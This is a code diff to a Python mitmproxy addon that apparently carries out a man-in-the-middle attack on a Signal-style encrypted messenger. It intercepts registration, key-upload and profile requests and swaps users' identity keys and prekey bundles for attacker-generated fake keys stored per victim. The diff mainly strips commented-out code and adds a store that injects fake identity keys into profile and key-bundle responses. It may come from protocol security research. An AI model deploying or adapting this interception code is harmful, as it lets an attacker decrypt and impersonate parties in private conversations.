@@ -27,6 +27,7 @@ from collections import defaultdict
 
 registration_info = dict()
 conversation_session = dict()
+bobs_bundle = dict()
 
 
 @dataclass 
@@ -66,42 +67,6 @@ class RegistrationInfo():
 
     aciData: KeyData = None
     pniData: KeyData = None
-    ######## Legitimate keys
-    # aci_IdenKey: Optional[identity_key.IdentityKeyPair] = None
-    # pni_IdenKey: Optional[identity_key.IdentityKeyPair] = None
-    # aci_SignedPreKey: Optional[dict] = None
-    # pni_SignedPreKey: Optional[dict] = None
-    # aci_pq_lastResortKey: Optional[dict] = None
-    # pni_pq_lastResortKey: Optional[dict] = None
-    # aci_PreKeys: Optional[dict] = None
-    # pni_PreKeys: Optional[dict] = None
-    # aci_pq_PreKeys: Optional[dict] = None
-    # pni_pq_PreKeys: Optional[dict] = None
-
-    ####### Fake keys
-    # aci_fake_IdenKey: Optional[identity_key.IdentityKeyPair] = None
-    # pni_fake_IdenKey: Optional[identity_key.IdentityKeyPair] = None
-
-    # aci_fake_SignedPreKeys: Optional[dict] = None
-    # aci_fake_secret_SignedPreKeys: Optional[dict] = None
-    # pni_fake_SignedPreKeys: Optional[dict] = None
-    # pni_fake_secret_SignedPreKeys: Optional[dict] = None
-
-    # aci_fake_PreKeys: Optional[dict] = None
-    # aci_fake_secret_PreKeys: Optional[dict] = None
-    # pni_fake_PreKeys: Optional[dict] = None
-    # pni_fake_secret_PreKeys: Optional[dict] = None
-
-    # aci_fake_pq_PreKeys: Optional[dict] = None
-    # aci_fake_secret_pq_PreKeys: Optional[dict] = None
-    # pni_fake_pq_PreKeys: Optional[dict] = None
-    # pni_fake_secret_pq_PreKeys: Optional[dict] = None
-
-    # aci_fake_lastResortKey: Optional[dict] = None
-    # aci_fake_secret_lastResortKey: Optional[dict] = None
-    # pni_fake_lastResortKey: Optional[dict] = None
-    # pni_fake_secret_lastResortKey: Optional[dict] = None
-
 
 @dataclass
 class BobIdenKey():
@@ -174,33 +139,7 @@ def _v1_registration(flow: HTTPFlow):
                                                     )
 
     )
-    # registration_info[flow.client_conn.address[0]] = RegistrationInfo(
-    #                                                 unidentifiedAccessKey = unidentifiedAccessKey,
-    #                                                 aci_IdenKey = aci_IdenKey, 
-    #                                                 pni_IdenKey= pni_IdenKey, 
-    #                                                 aci_SignedPreKey = aci_SignedPreKey,
-    #                                                 pni_SignedPreKey = pni_SignedPreKey,
-    #                                                 aci_pq_lastResortKey = aci_pq_lastResortKey,
-    #                                                 pni_pq_lastResortKey = pni_pq_lastResortKey, 
 
-    #                                                 aci_fake_IdenKey = aci_fake_IdenKey, 
-    #                                                 pni_fake_IdenKey = pni_fake_IdenKey,
-    #                                                 aci_fake_SignedPreKeys = fake_signed_pre_keys["aciSignedPreKey"], 
-    #                                                 aci_fake_secret_SignedPreKeys = fake_secret_SignedPreKeys["aciSignedPreKeySecret"],
-    #                                                 pni_fake_SignedPreKeys = fake_signed_pre_keys["pniSignedPreKey"],
-    #                                                 pni_fake_secret_SignedPreKeys = fake_secret_SignedPreKeys["pniSignedPreKeySecret"],
-
-    #                                                 aci_fake_lastResortKey = fake_signed_pre_keys["aciPqLastResortPreKey"],
-    #                                                 aci_fake_secret_lastResortKey = fake_secret_SignedPreKeys["aciPqLastResortSecret"],
-    #                                                 pni_fake_lastResortKey = fake_signed_pre_keys["pniPqLastResortPreKey"],
-    #                                                 pni_fake_secret_lastResortKey = fake_secret_SignedPreKeys["pniPqLastResortSecret"],
-    #                                                                 )
-
-    #logging.info(f"REGISTRATION INFO: {registration_info}")
-    #logging.exception(f"{registration_info}")
-    ### TODO: create the Alice classes 
-
-    #logging.info(f"POST {json.loads(flow.request.content.decode())}")
     flow.request.content = json.dumps(req).encode()
 
 @api.route("/v1/registration", rtype = RouteType.RESPONSE)
@@ -217,8 +156,6 @@ def _v1_registration(flow: HTTPFlow):
         isVictim = True
     )
 
-    #logging.info(registration_info)
-
     device = Device.insert(
         aci = resp["uuid"],
         pni = resp["pni"],
@@ -227,15 +164,6 @@ def _v1_registration(flow: HTTPFlow):
         pniIdenKey = registration_info[ip_address].pniData.IdenKey,
         unidentifiedAccessKey = registration_info[ip_address].unidentifiedAccessKey,
     )
-
-    # device = Device.insert(
-    #     aci = resp["uuid"],
-    #     pni = resp["pni"],
-    #     deviceId = 1,
-    #     aciIdenKey = registration_info[ip_address].aci_IdenKey,
-    #     pniIdenKey = registration_info[ip_address].pni_IdenKey,
-    #     unidentifiedAccessKey = registration_info[ip_address].unidentifiedAccessKey,
-    # )
 
     user.on_conflict_replace().execute()
     device.on_conflict_replace().execute()
@@ -294,7 +222,7 @@ def _v2_keys(flow: HTTPFlow):
         type = identity,
         aci = registration_info[address].aci,
         deviceId = 1, # todo: shouldnt be static
-        FakeIdenKey = key_data.fake_IdenKey, 
+        FakeIdenKey = (base64.b64encode(key_data.fake_IdenKey.public_key().serialize()).decode("utf-8"), b64encode(key_data.fake_IdenKey.private_key().serialize()).decode("utf-8")),
         FakeSignedPreKey = (key_data.fake_SignedPreKeys, key_data.fake_secret_SignedPreKeys),
         FakePrekeys = (key_data.fake_PreKeys, key_data.fake_secret_PreKeys),
         fakeKyberKeys = (key_data.fake_pq_PreKeys, key_data.fake_secret_pq_PreKeys),
@@ -303,95 +231,6 @@ def _v2_keys(flow: HTTPFlow):
 
     legit_bundle.on_conflict_replace().execute()
     mitm_bundle.on_conflict_replace().execute()
-    # if identity == "aci":
-    #     try:
-    #         alice_identity_key_pair = registration_info[address].aci_fake_IdenKey
-    #     except KeyError:
-    #         logging.exception(f"{flow} AND {registration_info}")
-
-    #     pq_pre_keys = req["pqPreKeys"]
-    #     pre_keys = req["preKeys"]
-
-    #     registration_info[address].aci_pq_PreKeys = pq_pre_keys
-    #     registration_info[address].aci_PreKeys = pre_keys
-
-    #     fake_pre_keys, fake_secret_PreKeys = helpers.create_keys_data(100, alice_identity_key_pair)
-
-    #     req.update(fake_pre_keys)
-
-    #     registration_info[address].aci_fake_PreKeys = fake_pre_keys["preKeys"]
-    #     registration_info[address].aci_fake_secret_PreKeys = fake_secret_PreKeys["preKeys"]
-    #     registration_info[address].aci_fake_pq_PreKeys = fake_pre_keys["pqPreKeys"]   
-    #     registration_info[address].aci_fake_secret_pq_PreKeys = fake_secret_PreKeys["pqPreKeys"]
-
-
-    #     legit_bundle = LegitBundle.insert(
-    #         type = "aci",
-    #         aci = registration_info[address].aci,
-    #         deviceId = 1,
-    #         SignedPreKey = registration_info[address].aci_SignedPreKey,
-    #         PreKeys = registration_info[address].aci_PreKeys,
-    #         kyberKeys = registration_info[address].aci_pq_PreKeys,
-    #         lastResortKyber = registration_info[address].aci_pq_lastResortKey
-    #     )
-
-    #     mitm_bundle = MitMBundle.insert(
-    #         type = "aci",
-    #         aci = registration_info[address].aci,
-    #         deviceId = 1,
-    #         FakeIdenKey = registration_info[address].aci_fake_IdenKey, 
-    #         FakeSignedPreKey = (registration_info[address].aci_fake_SignedPreKeys, registration_info[address].aci_fake_secret_SignedPreKeys),
-    #         FakePrekeys = (registration_info[address].aci_fake_PreKeys, registration_info[address].aci_fake_secret_PreKeys),
-    #         fakeKyberKeys = (registration_info[address].aci_fake_pq_PreKeys, registration_info[address].aci_fake_secret_pq_PreKeys),
-    #         fakeLastResortKyber = (registration_info[address].aci_fake_lastResortKey, registration_info[address].aci_fake_secret_lastResortKey)
-    #     )
-
-    #     legit_bundle.on_conflict_replace().execute()
-    #     mitm_bundle.on_conflict_replace().execute()
-
-    # elif identity == "pni":
-    #     alice_identity_key_pair = registration_info[address].pni_fake_IdenKey
-
-    #     pq_pre_keys = req["pqPreKeys"]
-    #     pre_keys = req["preKeys"]
-
-    #     registration_info[address].pni_pq_PreKeys = pq_pre_keys
-    #     registration_info[address].pni_PreKeys = pre_keys
-
-    #     fake_pre_keys, fake_secret_PreKeys = helpers.create_keys_data(100, alice_identity_key_pair)
-
-    #     req.update(fake_pre_keys)
-
-    #     registration_info[address].pni_fake_PreKeys = fake_pre_keys['preKeys']
-    #     registration_info[address].pni_fake_secret_PreKeys = fake_secret_PreKeys['preKeys']
-    #     registration_info[address].pni_fake_pq_PreKeys = fake_pre_keys["pqPreKeys"]
-    #     registration_info[address].pni_fake_secret_pq_PreKeys = fake_secret_PreKeys["pqPreKeys"]
-    #     # registration_info[address].pni_pq_PreKeys = pq_pre_keys
-    #     # registration_info[address].pni_secret_pq_PreKeys = fake_secret_PreKeys
-
-    #     legit_bundle = LegitBundle.insert(
-    #         type = "pni",
-    #         aci = registration_info[address].aci,
-    #         deviceId = 1,
-    #         SignedPreKey = registration_info[address].pni_SignedPreKey,
-    #         PreKeys = registration_info[address].pni_PreKeys,
-    #         kyberKeys = registration_info[address].pni_pq_PreKeys,
-    #         lastResortKyber = registration_info[address].pni_pq_lastResortKey
-    #     )
-
-    #     mitm_bundle = MitMBundle.insert(
-    #         type = "pni",
-    #         aci = registration_info[address].aci,
-    #         deviceId = 1,
-    #         FakeIdenKey = registration_info[address].pni_fake_IdenKey,
-    #         FakeSignedPreKey = (registration_info[address].pni_fake_SignedPreKeys, registration_info[address].pni_fake_secret_SignedPreKeys),
-    #         FakePrekeys = (registration_info[address].pni_fake_PreKeys, registration_info[address].pni_fake_secret_PreKeys),
-    #         fakeKyberKeys = (registration_info[address].pni_fake_pq_PreKeys, registration_info[address].pni_fake_secret_pq_PreKeys),
-    #         fakeLastResortKyber = (registration_info[address].pni_fake_lastResortKey, registration_info[address].pni_fake_secret_lastResortKey)
-    #     )
-
-    #     legit_bundle.on_conflict_replace().execute()
-    #     mitm_bundle.on_conflict_replace().execute()
 
     flow.request.content = json.dumps(req).encode()
 
@@ -455,22 +294,27 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
     for id, bundle in enumerate(resp["devices"]):
         # This should impersonate Bob's info 
-        identity_key = MitMBundle.select().where(MitMBundle.type == identity,
-                                                    MitMBundle.aci == uuid,
-                                                    MitMBundle.deviceId == device_id).first()
+        # identity_key = MitMBundle.select().where(MitMBundle.type == identity,
+        #                                             MitMBundle.aci == uuid,
+        #                                             MitMBundle.deviceId == device_id).first()
+        
+        identity_key = bobs_bundle.get(uuid)
 
         if not identity_key:
             # todo create row
             fakeUser = MitmUser(address = address.ProtocolAddress(uuid, id))
+            identity_key = fakeUser.pre_key_bundle.identity_key()
+
         else:
-            fakeUser = MitmUser(address = address.ProtocolAddress(uuid, id), identity_key = identity_key.FakeIdenKey)
+            fakeUser = MitmUser(address = address.ProtocolAddress(uuid, id), identity_key = identity_key.fake_identityKey)
+            identity_key = identity_key.fake_identityKey
         
         fakeBundle = fakeUser.pre_key_bundle.to_dict()
 
         logging.info(f"FAKE BUNDLE: {json.dumps(fakeBundle, indent=4)}")
 
         fakeBundle_wire = {
-            "identityKey": fakeBundle["identity_key_public"],
+            "identityKey": base64.b64encode(identity_key.public_key().serialize()).decode("utf-8"),
             "devices": [
                 {
                     "devicedId": 1,
@@ -518,10 +362,8 @@ def _v1_ws_my_profile(flow, identifier, version, credentialRequest):
     # raise RuntimeError(f"my profile: {identifier} {version} {credentialRequest}")
 
 def _v1_ws_profile_futut(flow, identifier, version):
-    logging.info(f"my profile: {identifier} {version}")
+    logging.info(f"my profile 2: {identifier} {version}")
     # raise RuntimeError(f"my profile: {identifier} {version}")
-
-
 
 def _v1_ws_profile(flow, identifier):
     # message = flow.websocket.messages[-1]
@@ -535,19 +377,22 @@ def _v1_ws_profile(flow, identifier):
 
     logging.info(f"PROFILE: {content}")
 
-    #pni = User.get(MitMBundle.type == uuid_type, MitMBundle.aci == uuid)
-    logging.warning(f"id: {identifier, uuid_type, uuid}")
+    idenKey = content["identityKey"]
 
     bundle = MitMBundle.select().where(MitMBundle.type == uuid_type, MitMBundle.aci == uuid).first()
 
     if bundle:
-        content["identityKey"] = bundle.FakeIdenKey.public_key.serialize()
+        public_fake_IdenKey = bundle.FakeIdenKey[0]
     else:
         fake_IdenKey = identity_key.IdentityKeyPair.generate()
+        bobs_bundle[uuid] = BobIdenKey(uuid, idenKey, fake_IdenKey)
+        public_fake_IdenKey = b64encode(bobs_bundle[uuid].fake_identityKey.public_key().serialize()).decode("utf-8")
+
 
     logging.info(f"BUNDLE: {bundle}")
+    content["identityKey"] = public_fake_IdenKey
 
-    #content["identityKey"] = registration_info[flow.client_conn.address[0]].aci_fake_IdenKey.public_key.serialize()
+    logging.info(f"content: {content}") #### TODO: what's happening here? No injection of fake identity key
 
     flow.response.content = json.dumps(content).encode()
 
